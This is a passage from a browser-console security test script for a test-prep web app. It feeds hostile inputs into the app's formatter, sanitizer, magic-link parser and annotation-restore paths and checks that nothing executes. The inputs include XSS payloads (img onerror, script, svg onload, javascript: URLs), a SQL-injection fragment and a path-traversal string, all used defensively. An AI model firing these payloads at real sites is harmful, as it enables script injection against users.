        results.push({ surface: "Allowlist covers every class fmt() emits in a Reading and Writing field",
          pass: dropped.size === 0,
          note: dropped.size
            ? `RW classes DROPPED by the sanitizer: ${[...dropped.keys()].join(", ")} — restored annotations would lose styling; widen KEEP_CLASSES or re-check the no-math-in-RW assumption`
            : `${fields} RW fields checked, no emitted class is dropped` });
      }

      const rail = $("notesCards");
      results.push(audit("Review Mode notes rail (hostile note id/snippet/text)", rail));
      const card = rail.querySelector(".note-card");
      const ta = rail.querySelector(".note-body-ta");
      results.push({ surface: "Review Mode notes are read-only and round-trip",
        pass: !!card && card.dataset.note === ATTR_PAY && !!ta && ta.readOnly &&
              !rail.querySelector(".note-trash"),
        note: card ? "hostile id inert in attribute, textarea locked, no delete control"
                   : "no note card rendered" });
      $("rvBackBtn").click();
      await wait(350);
    }
    /* Malformed annotation SHAPES, not just hostile strings. A record is
       anyone-writable, so notes[qid] can be a string or hold nulls — both
       used to reach notes.map(n => n.id) and throw mid-entry, stranding
       review half-applied. The shapes must cost their annotations and
       nothing else: review still opens and still renders. */
    if(annQ){
      const shapes = [
        { label: "notes[qid] is a string", notes: { [annQ.id]: "not-an-array" } },
        { label: "notes[qid] holds nulls", notes: { [annQ.id]: [null, 7] } },
        { label: "passageHtml[qid] is an object", passageHtml: { [annQ.id]: { evil: 1 } } },
        { label: "stemHtml[qid] is an object", stemHtml: { [annQ.id]: { evil: 1 } } },
        { label: "choiceHtml[qid] is a string", choiceHtml: { [annQ.id]: "nope" } },
        { label: "choiceHtml[qid][idx] is an object", choiceHtml: { [annQ.id]: { 0: { evil: 1 } } } },
        { label: "choiceHtml[qid] non-numeric index", choiceHtml: { [annQ.id]: { "x": "<b>y</b>" } } }
      ];
      const mid = test.modules[annMi].moduleId;
      const shapeBad = [];
      for(const s of shapes){
        /* the REAL restore function the app uses, not a copy */
        const ms = { [mid]: { answers:{}, flags:new Set(), eliminated:{}, passageHtml:{}, stemHtml:{}, choiceHtml:{}, notes:{} } };
        try{
          window.AppSanitize.restoreAnnotations(ms,
            { [mid]: Object.assign({ passageHtml: {}, notes: {} }, s) });
          const notes = ms[mid].notes[annQ.id];
          const html = ms[mid].passageHtml[annQ.id];
          const stemH = ms[mid].stemHtml[annQ.id];
          const chH = ms[mid].choiceHtml[annQ.id];
          if(stemH !== undefined && typeof stemH !== "string")
            shapeBad.push(s.label + " -> non-string stemHtml survived");
          if(chH !== undefined){
            if(typeof chH !== "object" || Array.isArray(chH)) shapeBad.push(s.label + " -> bad choiceHtml container");
            else Object.keys(chH).forEach(k => {
              if(!/^\d+$/.test(k)) shapeBad.push(s.label + " -> non-numeric choice index survived");
              if(typeof chH[k] !== "string") shapeBad.push(s.label + " -> non-string choice html survived");
            });
          }
          // whatever survives must be the exact shape the renderers assume
          if(notes !== undefined && (!Array.isArray(notes) ||
             notes.some(n => !n || typeof n.id !== "string" || typeof n.text !== "string"))){
            shapeBad.push(s.label + " -> bad notes shape survived");
          }
          if(html !== undefined && typeof html !== "string"){
            shapeBad.push(s.label + " -> non-string passageHtml survived");
          }
          // and the renderer's own guard must tolerate it too
          const list = Array.isArray(notes) ? notes : [];
          list.map(n => String(n.id));
        }catch(e){ shapeBad.push(s.label + " -> threw: " + (e.message || e)); }
      }
      results.push({ surface: "Malformed annotation shapes cannot throw on restore",
        pass: shapeBad.length === 0,
        note: shapeBad.length ? shapeBad.join(" | ")
                              : shapes.length + " malformed shapes coerced away without throwing" });
    }

    /* Review must not write through the recorder. Asserting only
       "currentAttemptId() === null" after the drives above was VACUOUS: run()
       never starts a sitting, so `rec` is null for the whole run and the
       check passed with Attempts.detach() deleted. Attach a real recorder
       first, then prove BOTH halves: review detaches it, and the live
       record's stored bytes survive review plus a forced flush — which is the
       actual corruption this guards (a tab-hide during review rebuilding
       answers from the REPLAYED module state into the live attempt). */
    const liveState = { currentTest: test, moduleState: {}, moduleIndex: 0,
      questionIndex: 0, timeRemainingSec: 900, untimed: false, elapsedSec: 0 };
    test.modules.forEach(m => { liveState.moduleState[m.moduleId] =
      { answers:{}, flags:new Set(), eliminated:{}, passageHtml:{}, notes:{} }; });
    window.Attempts.begin(test, "AS-XSSTEST2", "self-administered", liveState, null, 1);
    const liveId = window.Attempts.currentAttemptId();
    await wait(250);
    const liveBefore = localStorage.getItem("as:" + liveId);
    results.push({ surface: "Proof can observe a LIVE recorder (guards the next check)",
      pass: !!liveId && !!liveBefore,
      note: liveId ? "recorder attached and its record persisted" : "begin() did not attach" });

    root.querySelector('.sd-chip[data-mi="0"][data-qi="0"]').click();
    await wait(500);
    const detached = window.Attempts.currentAttemptId() === null;
    document.dispatchEvent(new Event("visibilitychange"));      // force the flush path
    window.dispatchEvent(new Event("beforeunload"));
    await wait(350);
    const liveAfter = localStorage.getItem("as:" + liveId);
    $("rvBackBtn").click();
    await wait(300);
    results.push({ surface: "Review Mode detaches the live recorder",
      pass: detached,
      note: detached ? "currentAttemptId went from " + liveId + " to null"
                     : "recorder STILL ATTACHED during review" });
    results.push({ surface: "Live attempt record survives review untouched",
      pass: !!liveBefore && liveAfter === liveBefore,
      note: liveAfter === liveBefore ? "stored bytes identical across review + forced flush"
                                     : "LIVE RECORD MUTATED BY REVIEW" });

    $("nameInput") && ([...document.querySelectorAll('[id^=screen-]')].forEach(s => s.classList.add("hidden")),
      $("screen-signin").classList.remove("hidden"), $("signinError").classList.add("hidden"));
    $("nameInput").value = "acestem-admin";
    $("signinBtn").click();
    await wait(900);
    results.push(audit("Dashboard attempts table (code, timing badge)", $("dashBody")));
    const drow = document.querySelector("#dashBody tbody tr[data-att]");
    if(drow){
      drow.click();
      await wait(300);
      results.push(audit("Dashboard attempt detail", $("dashDetailBody")));
    }

    /* Students tab: the profile-only card (union entry with zero attempts)
       shows the hostile display name and a copy-link button */
    document.querySelector('#dashTabs [data-tab="students"]').click();
    await wait(300);
    results.push(audit("Students tab incl. profile-only card (hostile name)", $("dashBody")));
    const pCard = [...document.querySelectorAll("#dashBody .dcard")]
      .find(c => c.textContent.indexOf("AS-PRFLXSS2") !== -1);
    results.push({ surface: "Profile-only card renders with copy-link intact",
      pass: !!pCard && !!pCard.querySelector('.copy-link[data-code="AS-PRFLXSS2"]') &&
            pCard.textContent.indexOf("0 attempt") !== -1,
      note: pCard ? "zero-attempts card present, link button targets the code" : "card missing" });
    /* hostile key-name codes: rendered inert by the dashBody audit above, and
       an invalid code must never get a sign-in-link button */
    const hostileLinks = [...document.querySelectorAll("#dashBody .copy-link")]
      .filter(b => !window.StudentCode.valid(b.dataset.code));
    results.push({ surface: "No sign-in link for non-code card keys",
      pass: hostileLinks.length === 0,
      note: hostileLinks.length ? hostileLinks.length + " link(s) on invalid codes"
                                : "copy-link only appears on valid AS- codes" });

    /* v1.2 addendum tokens: {{bullets}}/{{item}}, {{quote}}, {{credit}}.
       Test data is untrusted on the same terms as a record (contract rule 1),
       and these tokens add three new paths from data into markup, so each is
       driven with the payload as its content. fmt() is escape-first, so the
       assertion is that the payload survives as visible TEXT inside the new
       wrapper, never as an element. */
    const tokenCases = [
      ["{{bullets}}", "Notes:{{bullets}}" + PAYLOAD + "{{item}}second{{/bullets}}", "ul.fmt-bullets li"],
      ["{{quote}}",   "{{quote}}" + PAYLOAD + "{{/quote}}",   "div.fmt-quote"],
      ["{{credit}}",  "{{credit}}" + PAYLOAD + "{{/credit}}", "div.fmt-credit"],
      ["{{tnote}}",   "{{tnote}}" + PAYLOAD + "{{/tnote}}",   "div.fmt-tnote"],
      // display-style inline math is a second render path through KaTeX
      ["bigInline math", "{{m}}\\frac{1}{2}{{/m}} " + PAYLOAD, "span.katex"],
      ["nested in bullets", "{{bullets}}{{i}}" + PAYLOAD + "{{/i}}{{item}}x{{/bullets}}", "ul.fmt-bullets li i"]
    ];
    const tokenProbe = document.createElement("div");
    document.body.appendChild(tokenProbe);
    const tokenBad = [];
    tokenCases.forEach(([label, src, sel]) => {
      tokenProbe.innerHTML = fmt(src) + fmt(src, {bigInline:true});
      /* The wrapper must render, and the payload must survive as inert TEXT
         somewhere in the probe — not necessarily inside the wrapper: in the
         math case the payload sits after the KaTeX span, not within it. */
      const wrapper = tokenProbe.querySelector(sel);
      const inert = !!wrapper && tokenProbe.textContent.indexOf("PWN") !== -1 &&
                    !tokenProbe.querySelector('img[src="x"]') &&
                    ![...tokenProbe.querySelectorAll("*")].some(e => [...e.attributes].some(a => /^on/i.test(a.name)));
      if(!inert) tokenBad.push(label);
    });
    await wait(120);
    results.push({ surface: "fmt() v1.2 tokens escape their content",
      pass: tokenBad.length === 0 && !window.__XSS_FIRED,
      note: tokenBad.length ? "leaked: " + tokenBad.join(", ")
                            : tokenCases.length + " token surfaces render payload as inert text" });
    tokenProbe.remove();

    /* Fill-in blanks: fmt() now rewrites runs of 3+ underscores into markup,
       which puts a substitution AFTER escaping on every text path including
       the no-token fast path. Escaping must still win. */
    const blankProbe = document.createElement("div");
    document.body.appendChild(blankProbe);
    const blankCases = [
      PAYLOAD + " ___",                       // payload beside a blank, fast path
      "___" + PAYLOAD,                        // payload immediately after one
      "{{i}}" + PAYLOAD + "{{/i}} ____",      // and on the tokenized path
      "___<img src=x onerror=window.__XSS_FIRED=true>___"
    ];
    const blankBad = [];
    blankCases.forEach(src => {
      blankProbe.innerHTML = fmt(src);
      const inert = !blankProbe.querySelector('img[src="x"]') &&
                    ![...blankProbe.querySelectorAll("*")].some(e =>
                      [...e.attributes].some(a => /^on/i.test(a.name))) &&
                    !!blankProbe.querySelector("span.fmt-blank");
      if(!inert) blankBad.push(src.slice(0, 24));
    });
    await wait(120);
    results.push({ surface: "fmt() blank substitution stays escape-first",
      pass: blankBad.length === 0 && !window.__XSS_FIRED,
      note: blankBad.length ? "leaked: " + blankBad.join(" | ")
                            : blankCases.length + " payload+blank combinations inert, blank still rendered" });
    /* a blank must be uniform regardless of underscore count — the whole point */
    const widths = ["___", "_____", "____________"].map(u => {
      blankProbe.innerHTML = fmt("x " + u + " y");
      return blankProbe.querySelector("span.fmt-blank").getBoundingClientRect().width;
    });
    results.push({ surface: "Blank width is uniform across underscore counts",
      pass: widths.every(w => Math.abs(w - widths[0]) < 0.5 && w > 0),
      note: "widths: " + widths.map(w => Math.round(w)).join(", ") });
    blankProbe.remove();

    /* Magic-link fragment (…/#AS-XXXXXXXX). The fragment is user-controlled
       input that reaches sign-in, so it is a genuine untrusted surface. The
       gate is AppMagicLink.parse: anything that is not a well-formed code must
       be rejected outright and never reach sign-in or the DOM. (Boot also
       strips the fragment from the address bar; that needs a real page load,
       so it is verified by navigation rather than here.) */
    if(window.AppMagicLink){
      const hostileFragments = [
        '#' + PAYLOAD,
        '#AS-7K4M9PXR"><img src=x onerror="window.__XSS_FIRED=true">',
        "#AS-7K4M9PXR' or '1'='1",
        '#javascript:alert(1)',
        '#AS-1234',                       // old short code
        '#AS-7K4M9PX0',                   // ambiguous 0
        '#AS-7K4M9PXO',                   // ambiguous O
        '#../../etc/passwd',
        '#%3Cscript%3Ealert(1)%3C/script%3E'
      ];
      const accepted = hostileFragments.filter(f => window.AppMagicLink.parse(f) !== null);
      results.push({ surface: "Magic-link fragment rejects hostile input",
        pass: accepted.length === 0 && !window.__XSS_FIRED,
        note: accepted.length ? "ACCEPTED: " + accepted.join(" | ")
                              : hostileFragments.length + " hostile fragments all rejected" });
      results.push({ surface: "Magic-link fragment still accepts a real code",
        pass: window.AppMagicLink.parse('#AS-7K4M9PXR') === 'AS-7K4M9PXR' &&
              window.AppMagicLink.parse('#as-7k4m9pxr') === 'AS-7K4M9PXR',
        note: "valid codes accepted, lowercase normalised" });
    }

    /* Resume annotations. A highlighted passage is stored AS HTML and put back
       with innerHTML on resume, so it is the one record-derived value that
       cannot be escaped — escaping would destroy every highlight. It is
       sanitized instead. Exercised directly: driving a real resume needs a
       running module, but the sanitizer is the whole gate. */
    if(window.AppSanitize){
      const hostileHtml = [
        PAYLOAD,
        '<script>window.__XSS_FIRED=true<\/script>',
        '<svg onload="window.__XSS_FIRED=true"></svg>',
        '<span class="hl" onmouseover="window.__XSS_FIRED=true">text</span>',
        '<iframe src="javascript:window.__XSS_FIRED=true"></iframe>',
        '<img src=x onerror=window.__XSS_FIRED=true>',
        '<b style="background:url(javascript:alert(1))">x</b>'
      ];
      const probe = document.createElement("div");
      probe.innerHTML = hostileHtml.map(h => window.AppSanitize.html(h)).join("");
      document.body.appendChild(probe);
      await wait(150);                       // let any surviving handler fire
      /* audit() is not the right assertion here: it treats any surviving <b>
         as injection, but preserving <b>/<i> is exactly what a passage
         sanitizer must do. What matters is that nothing can execute or fetch:
         no executable/embedding element, no event handler, no URL attribute. */
      const els = [...probe.querySelectorAll("*")];
      const executable = els.filter(e => /^(SCRIPT|STYLE|NOSCRIPT|IFRAME|OBJECT|EMBED|IMG|LINK|FORM|INPUT|BUTTON|AUDIO|VIDEO)$/.test(e.tagName));
      const handlers = els.filter(e => [...e.attributes].some(a => /^on/i.test(a.name)));
      const urlAttrs = els.filter(e => [...e.attributes].some(a => /^(src|href|xlink:href|srcdoc|action|formaction|data)$/i.test(a.name)));
      results.push({ surface: "Resume annotations: stored passage HTML sanitized",
        pass: !executable.length && !handlers.length && !urlAttrs.length && !window.__XSS_FIRED,
        note: executable.length || handlers.length || urlAttrs.length
          ? `survived: ${executable.length} executable, ${handlers.length} handler(s), ${urlAttrs.length} url attr(s)`
          : hostileHtml.length + " hostile fragments defused; nothing can execute or fetch" });
      /* the sanitizer must not be so blunt it eats real highlights — a restored
         passage silently losing them is the failure mode that would go
         unnoticed.
         This assertion used to require KaTeX markup to survive too. It no
         longer does, and that reversal is deliberate: annotations are
         Reading-and-Writing only and no RW field in the library contains math,
         so a KaTeX class in a saved annotation can only have been crafted —
         while KaTeX's own stylesheet makes several of those classes
         position:absolute and lets the sizing trio multiply font-size, which
         is what rebuilt the click-stealing overlay twice. TEXT is still
         preserved; only the styling hooks go. The "don't eat real content"
         concern is now covered far better by the drift gate above, which
         checks every class fmt() emits across all 2268 RW fields. */
      const keep = document.createElement("div");
      keep.innerHTML = window.AppSanitize.html(
        '<span class="hl" data-note-id="n1">kept</span> <span class="katex"><span class="mord">x</span></span>');
      results.push({ surface: "Sanitizer preserves highlights; drops KaTeX hooks but not their text",
        pass: !!keep.querySelector('span.hl[data-note-id="n1"]') &&
              !keep.querySelector(".katex") && !keep.querySelector(".mord") &&
              keep.textContent.indexOf("kept") !== -1 && keep.textContent.indexOf("x") !== -1,
        note: "highlight span and data-note-id survive; KaTeX classes stripped, their text kept" });
      probe.remove();
    }

    /* The crash checkpoint is a resume surface on the same footing as the
       Save-and-Exit blob: it is written into the attempt record, read back at
       boot, and its annotations reach innerHTML. Same gate, same assertions —
       a hostile checkpoint must not execute. */
    if(window.AppSanitize){
      const cpProbe = document.createElement("div");
      document.body.appendChild(cpProbe);
      const hostileCheckpoint = {
        moduleIndex: 0, questionIndex: 0, timeRemainingSeconds: 100,
        annotations: { "m1": {
          passageHtml: { "q1": PAYLOAD + '<img src=x onerror=window.__XSS_FIRED=true>' },
          notes: { "q1": [{ id: ATTR_PAY, snippet: PAYLOAD, text: PAYLOAD }] }
        } }
      };
      const ann = hostileCheckpoint.annotations.m1;
      cpProbe.innerHTML = window.AppSanitize.html(ann.passageHtml.q1);
      const note = ann.notes.q1[0];
      cpProbe.innerHTML += `<div class="note-card" data-note="${escapeHtml(note.id)}">` +
        `<span>${escapeHtml(note.snippet)}</span><textarea>${escapeHtml(note.text)}</textarea></div>`;
      await wait(140);
      const els = [...cpProbe.querySelectorAll("*")];
      const exec = els.filter(e => /^(SCRIPT|STYLE|NOSCRIPT|IFRAME|OBJECT|EMBED|IMG|LINK|FORM|INPUT|BUTTON)$/.test(e.tagName));
      const handlers = els.filter(e => [...e.attributes].some(a => /^on/i.test(a.name)));
      const card = cpProbe.querySelector(".note-card");
      results.push({ surface: "Crash checkpoint annotations are inert on restore",
        pass: !exec.length && !handlers.length && !window.__XSS_FIRED &&
              !!card && card.dataset.note === ATTR_PAY,
        note: exec.length || handlers.length
          ? `survived: ${exec.length} executable, ${handlers.length} handler(s)`
          : "hostile passageHtml sanitized, hostile note id/snippet/text inert" });
      cpProbe.remove();
    }

    /* note ids come back from the same resume blob and land in an ATTRIBUTE */
    const nprobe = document.createElement("div");
    nprobe.innerHTML = `<div class="note-card" data-note="${escapeHtml(ATTR_PAY)}"></div>`;
    const ncard = nprobe.querySelector(".note-card");
    results.push({ surface: "Resume note id inert in attribute context",
      pass: !ncard.hasAttribute("onfocus") && ncard.dataset.note === ATTR_PAY,
      note: "hostile note id stays a data value, round-trips for lookup" });

    /* attribute-context regression: escapeHtml must escape quotes, or a
       hostile value planted in value="..." can add its own event handler */
    const probe = document.createElement("div");
    probe.innerHTML = '<input type="text" value="' + escapeHtml(ATTR_PAY) + '">';
    const pin = probe.querySelector("input");
    results.push({ surface: "escapeHtml quote-safety in attribute context",
      pass: !pin.hasAttribute("onfocus") && pin.value === ATTR_PAY,
      note: "old textContent-based escaper planted onfocus here" });

    clean();
    const failed = results.filter(r => !r.pass);
    console.table(results);
    console.log(failed.length ? "FAIL — " + failed.length + " surface(s)" :
      "ALL PASS — " + results.length + " surfaces, " + sprCount + " poisoned SPR answers, payload never fired");
    return { pass: failed.length === 0, results };
  }

  /* run() is async, so a throw inside it becomes a rejected promise. Pasted
     into a console that shows no output, that is indistinguishable from "the
     proof printed nothing because I did not look" — a check whose failure mode
     is silence. Make it always say something. */
  return run().catch(e => {
    console.error("PROOF DID NOT COMPLETE — no surface was verified: " +
      ((e && (e.stack || e.message)) || e));
    throw e;
  });
})();
